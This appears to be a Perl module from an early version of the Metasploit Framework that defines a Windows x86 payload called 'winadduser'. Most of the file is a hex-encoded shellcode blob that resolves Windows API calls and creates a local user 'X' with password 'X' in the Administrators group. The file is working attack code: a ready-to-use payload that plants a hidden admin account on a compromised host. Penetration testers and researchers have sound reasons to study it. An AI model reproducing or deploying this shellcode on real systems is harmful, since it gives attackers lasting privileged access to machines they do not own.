package Msf::Payload::win32_adduser;
use strict;
use base 'Msf::Win32Payload';
use Pex::Utils;

my $info =
{
    'Name'         => 'winadduser',
    'Version'      => '1.0',
    'Description'  => 'Create admin user X with pass X',
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'         => [ 'x86' ],
    'Priv'         => 1,
    'OS'           => [ 'win32' ],
    'Multistage'   => 0,
    'Type'         => 'none',
    'Size'         => '',
    'UserOpts'     => {  },
    # win32 specific code
    'Win32Payload' =>
    {
        Offsets => { 'EXITFUNC' => [21, 'L'] },
        Payload =>
        "\x81\xec\x0f\x0b\x00\x00\x89\xe6\x89\xe5\xe8\xb9\x00\x00\x00\x89".
        "\x06\x89\xc3\x53\x68\x7e\xd8\xe2\x73\xe8\xbf\x00\x00\x00\x89\x46".
        "\x0c\x53\x68\x8e\x4e\x0e\xec\xe8\xb1\x00\x00\x00\x89\x46\x08\x31".
        "\xdb\x53\x68\x70\x69\x33\x32\x68\x6e\x65\x74\x61\x54\xff\xd0\x89".
        "\x46\x04\x89\xc3\x53\x68\x5e\xdf\x7c\xcd\xe8\x8e\x00\x00\x00\x89".
        "\x46\x10\x53\x68\xd7\x3d\x0c\xc3\xe8\x80\x00\x00\x00\x89\x46\x14".
        "\x31\xc0\x31\xdb\x43\x50\x68\x72\x00\x73\x00\x68\x74\x00\x6f\x00".
        "\x68\x72\x00\x61\x00\x68\x73\x00\x74\x00\x68\x6e\x00\x69\x00\x68".
        "\x6d\x00\x69\x00\x68\x41\x00\x64\x00\x89\x66\x1c\x50\x6a\x58\x89".
        "\xe1\x89\x4e\x18\x68\x00\x00\x5c\x00\x50\x53\x50\x50\x53\x50\x51".
        "\x51\x89\xe1\x50\x54\x51\x53\x50\xff\x56\x10\x8b\x4e\x18\x49\x49".
        "\x51\x89\xe1\x6a\x01\x51\x6a\x03\xff\x76\x1c\x6a\x00\xff\x56\x14".
        "\x31\xdb\x53\xff\x56\x0c\xff\xd3\x56\x6a\x30\x59\x64\x8b\x01\x8b".
        "\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\x5e\xc2\x04\x00\x53\x55\x56".
        "\x57\x8b\x6c\x24\x18\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a".
        "\x18\x8b\x5a\x20\x01\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff".
        "\xfc\x31\xc0\xac\x38\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b".
        "\x7c\x24\x14\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a".
        "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e".
        "\x5d\x5b\xc2\x08\x00",
    }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->InitWin32;
    return($self);
}
